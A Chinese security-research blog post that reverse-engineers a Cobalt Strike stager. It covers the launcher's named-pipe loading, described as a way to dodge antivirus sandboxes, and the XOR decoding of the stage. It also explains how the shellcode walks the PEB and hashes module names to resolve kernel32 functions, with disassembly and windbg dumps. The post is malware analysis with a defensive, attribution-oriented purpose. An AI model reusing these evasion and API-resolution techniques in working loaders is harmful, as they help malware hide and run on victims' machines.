<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>Cobalt Strike Stager &amp; Stage Shellcode 深度解析 | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>

<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>

        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
			expand_toc()
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Cobalt Strike Stager &amp; Stage Shellcode 深度解析</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十月 22, 2020&nbsp;&nbsp;0:00:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/安全研究/">安全研究</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="cobalt-strike-stager-stage-shellcode-深度解析"><a class="markdownIt-Anchor" href="#cobalt-strike-stager-stage-shellcode-深度解析"></a> Cobalt Strike Stager &amp; Stage Shellcode 深度解析</h1>
<h2 id="一-恶意代码下发"><a class="markdownIt-Anchor" href="#一-恶意代码下发"></a> 一、恶意代码下发</h2>
<p>我们先来了解CS恶意代码下发以及通信基本流程，其示意图如下图所示：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/CS%E4%B8%8B%E5%8F%91&amp;%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B.png" alt="CS下发&amp;通信流程"></p>
<p>CS在3.x版本较多地使用分（阶）段式恶意代码下发手法——以小巧的shellcode嵌入到可执行文件、注入进程等方式下载较大的、功能较全的Payload。而在4.0版本，CS默认使用Stageless，即不分阶段，将功能完全的Payload直接嵌入可执行文件或者以其他方式执行，官方文章提出这么做是出于安全考虑。</p>
<p>的确，因为以Stage方式下发，我们能从的Stage中获得很多C&amp;C服务器的信息，以达到溯源、反制的目的。这很大程度要归功于Stager，也就是那段小巧的shellcode并不能带上AES或者RSA等复杂的加密算法，毕竟这会使得shellcode体积变得很大，不利于落地。于是CS选择了以异或的方式对Stage进行了简单的加密，而异或密钥xor_key就包含在下发的Stage中。</p>
<h2 id="二-stager-shellcode"><a class="markdownIt-Anchor" href="#二-stager-shellcode"></a> 二、Stager Shellcode</h2>
<h3 id="1-launcher"><a class="markdownIt-Anchor" href="#1-launcher"></a> 1. Launcher</h3>
<p>上面提到，Stager包含一段简短的Shellcode以下载Stage。我们以stage的方式生成一个可执行文件<code>Artifact.exe</code>。</p>
<div style="page-break-after: always;"></div> 
<p>由于可执行文件比较简单，没有玩啥花的，IDA里面可以直接F5。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021173228832.png" alt="image-20201021173228832"></p>
<p>函数<code>sub_4027B0()</code>与初始化有关，主要执行了<code>sub_4014F0()</code></p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021173332956.png" alt="image-20201021173332956"></p>
<p>主要的逻辑在<code>sub_401800()</code>中实现：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021173812934.png" alt="image-20201021173812934"></p>
<p><code>sub_401800()</code>将全局变量<code>FileName</code>填充为<code>\\.\pipe\MSSE-%d-server</code>的形式，然后另起线程调用<code>sub_4016D3()</code>，而<code>sub_4016D3()</code>调用<code>sub_401608()</code>建立管道，将加密的shellcode写入管道。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021173926353.png" alt="image-20201021173926353"></p>
<p>在<code>sub_401800()</code>最后调用的<code>sub_4017A2()</code>中申请了一个堆用于存放shellcode并且为了等待线程写入完毕，特意等待了1024ms。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174018843.png" alt="image-20201021174018843"></p>
<p>然后就是循环调用<code>sub_4016F2</code>读取管道中的shellcode。</p>
<p>折腾这么一出是因为为了躲过杀软的沙箱查杀，因为沙箱不能很好的模拟管道（可能是因为效率也可能是因为觉得并无必要？）故无法执行代码进行查杀，而常规的数组加载shellcode会导致直接被杀掉。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174123458.png" alt="image-20201021174123458"></p>
<p>最后<code>sub_401559()</code>中，将读入堆中的shellcode进行解密并申请虚拟空间，用<code>VirtualProtect()</code>将申请到的空间加入可读和执行权限再创建线程执行：</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174201888.png" alt="image-20201021174201888"></p>
<div style="page-break-after: always;"></div> 
<h3 id="2-stager-shellcode"><a class="markdownIt-Anchor" href="#2-stager-shellcode"></a> 2. Stager Shellcode</h3>
<h4 id="21-start"><a class="markdownIt-Anchor" href="#21-start"></a> 2.1  start</h4>
<p>xor解密是四字节一组进行解密的，并且只用到了<code>xor_key</code>的前四个字节。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174251460.png" alt="image-20201021174251460"></p>
<p>而解码后的shellcode可以转换为如下的x86汇编代码:</p>
<pre class="highlight"><code class="x86asm"><span class="number">0x0000</span>:  FC                <span class="keyword">cld</span>    
<span class="number">0x0001</span>:  E8 <span class="number">89</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">call</span>   <span class="number">0x8f</span>  
<span class="comment">;======================== 寻找函数地址 ==========================</span>
...
<span class="comment">; ======================== 核心函数 =============================</span>
<span class="number">0x008f</span>:  <span class="number">5D</span>                <span class="keyword">pop</span>    <span class="built_in">ebp</span>
<span class="number">0x0090</span>:  <span class="number">68</span> 6E <span class="number">65</span> <span class="number">74</span> <span class="number">00</span>    <span class="keyword">push</span>   <span class="number">0x74656e</span>   <span class="comment">; "wininet\x00"入栈</span>
<span class="number">0x0095</span>:  <span class="number">68</span> <span class="number">77</span> <span class="number">69</span> 6E <span class="number">69</span>    <span class="keyword">push</span>   <span class="number">0x696e6977</span>
<span class="number">0x009a</span>:  <span class="number">54</span>                <span class="keyword">push</span>   <span class="built_in">esp</span>       
<span class="number">0x009b</span>:  <span class="number">68</span> 4C <span class="number">77</span> <span class="number">26</span> <span class="number">07</span>    <span class="keyword">push</span>   <span class="number">0x726774c</span>
<span class="number">0x00a0</span>:  FF D5             <span class="keyword">call</span>   <span class="built_in">ebp</span>        <span class="comment">; LoadLibraryA("wininet")</span>
</code></pre>
<p>先<code>cld</code>清理符号位，再用<code>call</code>将寻址函数地址入栈，然后再<code>pop ebp</code>，后续所有的函数都是以<code>call ebp</code>的形式调用，重点关注一下shellcode是如何找到函数地址的。</p>
<h4 id="22-函数寻址"><a class="markdownIt-Anchor" href="#22-函数寻址"></a> 2.2 函数寻址</h4>
<pre class="highlight"><code class="x86asm"><span class="comment">;========================= 寻找函数地址 ========================</span>
<span class="number">0x0006</span>:  <span class="number">60</span>            pushal <span class="comment">;push EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI</span>
<span class="number">0x0007</span>:  <span class="number">89</span> E5         <span class="keyword">mov</span>    <span class="built_in">ebp</span>, <span class="built_in">esp</span>
<span class="number">0x0009</span>:  <span class="number">31</span> D2         <span class="keyword">xor</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span>
<span class="number">0x000b</span>:  <span class="number">64</span> 8B <span class="number">52</span> <span class="number">30</span>   <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">fs</span>:[<span class="built_in">edx</span> + <span class="number">0x30</span>]       <span class="comment">;edx=PEB</span>
<span class="number">0x000f</span>:  8B <span class="number">52</span> 0C      <span class="keyword">mov</span>    <span class="built_in">edx</span>, [<span class="built_in">edx</span> + <span class="number">0xc</span>]           <span class="comment">;edx=PEB_LDR_DATA</span>
<span class="number">0x0012</span>:  8B <span class="number">52</span> <span class="number">14</span>      <span class="keyword">mov</span>    <span class="built_in">edx</span>, [<span class="built_in">edx</span> + <span class="number">0x14</span>]          <span class="comment">;edx=InMemoryOrderModuleList</span>
<span class="number">0x0015</span>:  8B <span class="number">72</span> <span class="number">28</span>      <span class="keyword">mov</span>    <span class="built_in">esi</span>, [<span class="built_in">edx</span> + <span class="number">0x28</span>]          <span class="comment">;???</span>
<span class="number">0x0018</span>:  0F B7 4A <span class="number">26</span>   <span class="keyword">movzx</span>  <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span> + <span class="number">0x26</span>] <span class="comment">;???</span>
</code></pre>
<p>首先用<code>pushal</code>将所有寄存器在栈上存起来备份，再调整栈帧，<code>edx</code>置零。</p>
<p>寄存器<code>FS</code>在Windows上指向的是TEB线程信息块（Thread Environment Block）。读取TEB可以读取到进、线程以及与系统相关的信息。</p>
<p><code>TEB</code>结构用x86 windbg输出如下：</p>
<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _TEB
ntdll!_TEB
   +<span class="number">0x000</span> NtTib            : _NT_TIB
   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void
   +<span class="number">0x020</span> ClientId         : _CLIENT_ID
   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void
   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void
   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB      # Fetch
   +<span class="number">0x034</span> LastErrorValue   : Uint4B
   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B
   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void
   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void
   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B
   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B
   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void
   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B
   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B
   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] Ptr32 Void
   +<span class="number">0x1a4</span> ExceptionCode    : Int4B
   +<span class="number">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
   ....
</code></pre>
<p>故<code>mov edx, fs:[edx + 0x30]</code>是取的PEB的地址（Process Environment Block）。</p>
<p>而下一条指令<code>mov edx, [edx+0xc]</code>就很明显读取的是<code>Ldr</code>结构。</p>
<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _PEB
ntdll!_PEB
   +<span class="number">0x000</span> InheritedAddressSpace : UChar
   +<span class="number">0x001</span> ReadImageFileExecOptions : UChar
   +<span class="number">0x002</span> BeingDebugged    : UChar
   +<span class="number">0x003</span> BitField         : UChar
   +<span class="number">0x003</span> ImageUsesLargePages : Pos <span class="number">0</span>, <span class="number">1</span> Bit
   +<span class="number">0x003</span> IsProtectedProcess : Pos <span class="number">1</span>, <span class="number">1</span> Bit
   +<span class="number">0x003</span> IsLegacyProcess  : Pos <span class="number">2</span>, <span class="number">1</span> Bit
   +<span class="number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="number">3</span>, <span class="number">1</span> Bit
   +<span class="number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="number">4</span>, <span class="number">1</span> Bit
   +<span class="number">0x003</span> SpareBits        : Pos <span class="number">5</span>, <span class="number">3</span> <span class="meta">Bits</span>
   +<span class="number">0x004</span> Mutant           : Ptr32 Void
   +<span class="number">0x008</span> ImageBaseAddress : Ptr32 Void
   +<span class="number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA                   # Fetch
   +<span class="number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
   +<span class="number">0x014</span> SubSystemData    : Ptr32 Void
   +<span class="number">0x018</span> ProcessHeap      : Ptr32 Void
   +<span class="number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION
   +<span class="number">0x020</span> AtlThunkSListPtr : Ptr32 Void
   +<span class="number">0x024</span> IFEOKey          : Ptr32 Void
   +<span class="number">0x028</span> CrossProcessFlags : Uint4B
   ...
</code></pre>
<p>其数据结构为<code>_PEB_LDR_DATA</code>：</p>
<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _PEB_LDR_DATA
ntdll!_PEB_LDR_DATA
   +<span class="number">0x000</span> Length           : Uint4B
   +<span class="number">0x004</span> Initialized      : UChar
   +<span class="number">0x008</span> SsHandle         : Ptr32 Void
   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY
   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY           # Fetch
   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY
   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void
   +<span class="number">0x028</span> ShutdownInProgress : UChar
   +<span class="number">0x02c</span> ShutdownThreadId : Ptr32 Void
   ...
</code></pre>
<p>于是我们可以看到<code>mov edx, [edx+0x14]</code>读取的是<code>InMemoryOrderModuleList</code>，其数据结构为<code>_LIST_ENTRY</code>，微软文档中将<code>InMemoryOrderModuleList</code>描述为:</p>
<blockquote>
<p>The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an <strong>_LDR_DATA_TABLE_ENTRY</strong> structure.</p>
</blockquote>
<h5 id="221-奇怪的inmemoryordermodulelist指针"><a class="markdownIt-Anchor" href="#221-奇怪的inmemoryordermodulelist指针"></a> 2.2.1 奇怪的<code>InMemoryOrderModuleList</code>指针</h5>
<p>既然是一个包含<code>_LDR_DATA_TABLE_ENTRY</code> 指针的双链表结构，那么毫无疑问，结构体<code>_LIST_ENTRY</code>将包含首尾两个指针——分别为<code>Flink</code>和<code>Blink</code>：</p>
<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _LIST_ENTRY
ntdll!_LIST_ENTRY
   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY
   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRYas
</code></pre>
<p>由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而指令<code>mov esi, [edx+0x28]</code>却让人摸不着头脑：明明<code>_LIST_ENTRY</code>是一个8字节大小的双链表节点，你不取指针拿到<code>_LDR_DATA_TABLE_ENTRY</code>结构进行下一步操作而是直接拿链表地址<code>edx+0x28</code>赋值给<code>esi</code>，难道文档中的<code>Each item in the list is a pointer to a _LDR_DATA_TABLE_ENTRY structure</code>我们理解错了吗？</p>
<p>对此笔者进行了搜索，发现了一个国外论坛的帖子，十分有趣地讨论了这一个问题：</p>
<p><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/190128-inmemoryordermodulelist-documentation-im-confused.html" target="_blank" rel="noopener">InMemoryOrderModuleList Documentation - I’m confused</a></p>
<p>原贴如下：</p>
<hr>
<p>hey everyone,</p>
<p>i found a neat little tutorial to grab the base address of kernel32.dll without using GetModuleHandle. <a href="http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/" target="_blank" rel="noopener">http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/</a></p>
<p>i also found all the necessary structs here <a href="http://undocumented.ntinternals.net/" target="_blank" rel="noopener">http://undocumented.ntinternals.net/</a></p>
<p>i already successfully implemented this. according to the sources above, the base address is at 0x10 of the third list element. however MSDN documents something else: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx</a></p>
<p>Quote:</p>
<blockquote>
<p>InMemoryOrderModuleList</p>
<p>The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure. For more information, see Remarks.</p>
</blockquote>
<p>Code:</p>
<pre class="highlight"><code class="c"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> {</span>
PVOID Reserved1[<span class="number">2</span>];
LIST_ENTRY InMemoryOrderLinks;
PVOID Reserved2[<span class="number">2</span>];
PVOID DllBase;
PVOID EntryPoint;
PVOID Reserved3;
UNICODE_STRING FullDllName;
BYTE Reserved4[<span class="number">8</span>];
PVOID Reserved5[<span class="number">3</span>];
<span class="keyword">union</span> {
ULONG CheckSum;
PVOID Reserved6;
};
ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
</code></pre>
<p><strong>according to this, it should be at 0x18 (which isn’t the case. it is at 0x10 for sure, already tested it). am i misunderstanding the sentence “Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure.” or are microsoft just publishing wrong information?</strong><br>
/e: for reference, this works:<br>
Code:</p>
<pre class="highlight"><code class="c">PPEB ppeb   = <span class="keyword">reinterpret_cast</span>&lt;PPEB&gt;(__readfsdword(<span class="number">0x30</span>));m_hKernel32 = *<span class="keyword">reinterpret_cast</span>&lt;HMODULE*&gt;(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uintptr_t</span>&gt;(ppeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink) + <span class="number">0x10</span>);
</code></pre>
<p>and this doesn’t, although it is correct according to MSDN<br>
Code:</p>
<pre class="highlight"><code class="c">PPEB ppeb   = <span class="keyword">reinterpret_cast</span>&lt;PPEB&gt;(__readfsdword(<span class="number">0x30</span>));m_hKernel32 = <span class="keyword">reinterpret_cast</span>&lt;HMODULE&gt;(<span class="keyword">reinterpret_cast</span>&lt;PLDR_DATA_TABLE_ENTRY&gt;(ppeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink)-&gt;DllBase);
</code></pre>
<hr>
<p>发帖者声称找到了一种不需要<code>GetModuleHandle</code>函数就能优雅地定位<code>kernal32.dll</code>的方法，并对微软官方文档和偏移误差提出了疑问，同时也怀疑自己是否理解错了官方文档中的那句**“列表中每项都有一个指向LDR_DATA_TABLE_ENTRY 结构的指针”**。</p>
<p>而回答也十分言简意赅，指出了<code>Flink</code>和<code>Blink</code>是指向<code>LDR_DATA_TABLE_ENTRY</code>结构体中的<code>InMemoryOrderModuleList</code>而非结构体的起始地址，并同时给出了<code>CONTAINING_RECORD</code>宏的用法——给出数据结构与调用的成员，从而找到数据起始的地址。</p>
<hr>
<p>Each Flink and Blink are pointers to LDR_DATA_TABLE_ENTRY, like MSDN says. But they don’t point to the start of struct like your last piece of code assumes. They point to the InMemoryOrderModuleList member of the struct.<br>
To get the start of the LDR_DATA_TABLE_ENTRY from the FLink you have to subtract the InMemoryOrderModuleList field offset. This is what the CONTAINING_RECORD macro is used for.</p>
<pre class="highlight"><code class="c">PLDR_DATA_TABLE_ENTRY dataEntry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);
</code></pre>
<p>Where listEntry is one of the F/Blinks</p>
<hr>
<p>其中<code>CONTAINING_RECORD</code>宏的定义如下：</p>
<pre class="highlight"><code class="c"><span class="meta">#<span class="meta-keyword">define</span> CONTAINING_RECORD(address,type,field) ((type*)((PCHAR)(address)-(ULONG_PTR)(&amp;((type*)0)-&gt;field)))</span>
</code></pre>
<p>利用强制类型转换将地址0转化为<code>type</code>类型，即传进来的数据结构体类型，然后调用成员取其地址，因为强制类型转化的地址是0，那么调用其成员后的地址即为结构体内成员的偏移地址，故我们得到<code>成员真实地址 - 成员偏移地址=结构体起始地址</code>。</p>
<p>具体可以参考这两篇文章：</p>
<p><a href="https://www.cnblogs.com/Crazycatmiao/p/6731477.html" target="_blank" rel="noopener"> [CRAZYC4T] - CONTAINING_RECORD</a></p>
<p><a href="https://blog.twofei.com/546/" target="_blank" rel="noopener"> [movsb] - 我对CONTAINING_RECORD宏的详细解释</a></p>
<h5 id="222-奇怪的偏移0x28"><a class="markdownIt-Anchor" href="#222-奇怪的偏移0x28"></a> 2.2.2 奇怪的偏移<code>0x28</code></h5>
<p>那么我们将目光转回来。既然由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而在<code>_LDR_DATA_TABLE_ENTRY</code>结构体中<code>InMemoryOrderModuleList</code>是偏移为0x08，所以指令<code>mov esi, [edx+0x28]</code>访问的是<code>_LDR_DATA_TABLE_ENTRY+0x08+0x28</code>的地方，即偏移为<code>0x30</code>。</p>
<p>那么我们用x86 windbg输出<code>_LDR_DATA_TABLE_ENTRY</code>结构体：</p>
<pre class="highlight"><code class="x86asm"><span class="built_in">dt</span> _LDR_DATA_TABLE_ENTRY
ntdll!_LDR_DATA_TABLE_ENTRY
   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY
   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY
   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY
   +<span class="number">0x018</span> DllBase          : Ptr32 Void
   +<span class="number">0x01c</span> EntryPoint       : Ptr32 Void
   +<span class="number">0x020</span> SizeOfImage      : Uint4B
   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING
   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING  
   +<span class="number">0x034</span> Flags            : Uint4B           <span class="comment">;+0x030 x86asmxist. What???</span>
   +<span class="number">0x038</span> LoadCount        : Uint2B
   +<span class="number">0x03a</span> TlsIndex         : Uint2B
   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY
   +<span class="number">0x03c</span> SectionPointer   : Ptr32 Void
   +<span class="number">0x040</span> CheckSum         : Uint4B
   +<span class="number">0x044</span> TimeDateStamp    : Uint4B
   +<span class="number">0x044</span> LoadedImports    : Ptr32 Void
   +<span class="number">0x048</span> EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
   +<span class="number">0x04c</span> PatchInformation : Ptr32 Void
   +<span class="number">0x050</span> ForwarderLinks   : _LIST_ENTRY
   +<span class="number">0x058</span> ServiceTagLinks  : _LIST_ENTRY
   +<span class="number">0x060</span> StaticLinks      : _LIST_ENTRY
   +<span class="number">0x068</span> ContextInformation : Ptr32 Void
   +<span class="number">0x06c</span> OriginalBase     : Uint4B
   +<span class="number">0x070</span> LoadTime         : _LARGE_INTEGER
</code></pre>
<p>发现偏移<code>0x30</code>处并不存在完整的数据结构。</p>
<p>难道我们理解错了吗？</p>
<p>利用scdbg对进行shellcode调试发现指令<code>mov esi, [edx+0x28]</code>读到了偏移为<code>0x2c</code>的<code>BaseName</code>的地址，而<code>mov ecx, [edx+0x26]</code>则读到了对应的<code>BaseName</code>的字符串长度（后面发现其实是最大长度，长度不计算字符<code>\x00</code>）。</p>
<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201020115459257.png" alt="image-20201020115459257"></p>
<p>那么我们可以合理猜测，<code>BaseDLLName</code>的类型<code>_UNICODE_STRING</code>并非是一个简单的指针，而是一个结构体，包含了长度和地址等信息。</p>
<p>在文章<a href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/" target="_blank" rel="noopener">Locating DLL Name from the Process Environment Block (PEB)</a>中，我们的想法得到了印证：</p>
<hr>
<p>So what are we missing? Notice that <em>BaseDllName</em> is of type <em>UNICODE_STRING</em> this will require a little more investigation. According to Microsoft, this isn’t simply a pointer to a Unicode string but rather a <em>UNICODE_STRING</em> structure (<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wudfwdm/ns-wudfwdm-_unicode_string" target="_blank" rel="noopener">MSDN</a>), which is defined as:</p>
<pre class="highlight"><code class="C"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> {</span>
USHORT Length;
USHORT MaximumLength;
PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
</code></pre>
<p>Notice how this structure begins with two short values – <em>Length</em> and <em>MaximumLength</em>. To access the pointer to the string, we need to adjust from the base of this structure 4 bytes (2 shorts/2 bytes * 2). With this is mind, it should now be clear how the code is obtaining the Unicode string for the DLL name.</p>
<pre class="highlight"><code class="x86asm">+<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY
+<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY
+<span class="number">0x018</span> DllBase : Ptr32 Void
+<span class="number">0x01c</span> EntryPoint : Ptr32 Void
+<span class="number">0x020</span> SizeOfImage : Uint4B
+<span class="number">0x024</span> FullDllName : _UNICODE_STRING
+<span class="number">0x02c</span> BaseDllName : _UNICODE_STRING
+<span class="number">0x02c</span> Length : USHORT
+<span class="number">0x02e</span> MaximumLength : USHORT
+<span class="number">0x030</span> Buffer : PWSTR
</code></pre>
<hr>
<h5 id="223-通过hash找到目标函数"><a class="markdownIt-Anchor" href="#223-通过hash找到目标函数"></a> 2.2.3 通过Hash找到目标函数</h5>
<p>于是，指令<code>mov esi, [edx+0x28]</code>以及<code>mov esi, [edx+0x26]</code>将得到<code>esi=BaseDLLName</code>、<code>ecx=BaseDLLNameLen</code>。</p>
<p>接下来就是通过自己设计的一个算法计算<code>BaseDLLName</code>的HASH，存入栈中。</p>
<pre class="highlight"><code class="asm">0x001c:  31 FF        xor    edi, edi
0x001e:  31 C0        xor    eax, eax
0x0020:  AC           lodsb  al, byte ptr [esi]
0x0021:  3C 61        cmp    al, 0x61  ;&quot;a&quot;
0x0023:  7C 02        jl     0x27        
0x0025:  2C 20        sub    al, 0x20  ;lowercase to uppercase
0x0027:  C1 CF 0D     ror    edi, 0xd     
0x002a:  01 C7        add    edi, eax
0x002c:  E2 F0        loop   0x1e      ;calc DLL Hash
0x002e:  52           push   edx       ;save edx=InMemoryOrderModuleList
0x002f:  57           push   edi       ;save edi=DLL Hash
</code></pre>
<p>其实我们可以通过遍历链表得到了当前程序导入的所有<code>DLL Name Hash</code>，此时就可以与事先用hash算法计算出的<code>kernel32.dll</code>的哈希值<code>hash(&quot;kernel32.dll&quot;)</code>进行比较，从而知道当前<code>_LDR_DATA_TABLE_ENTRY</code>是不是我们想要的结构体，若匹配得上就取出<code>_LDR_DATA_TABLE_ENTRY</code>中的<code>DLL Base</code>，开始下一步寻找目标函数的操作。（就是跟Linux Pwn的差不多的思路，需要Leak动态链接库的基址然后找到对应的函数的虚拟地址VA）</p>
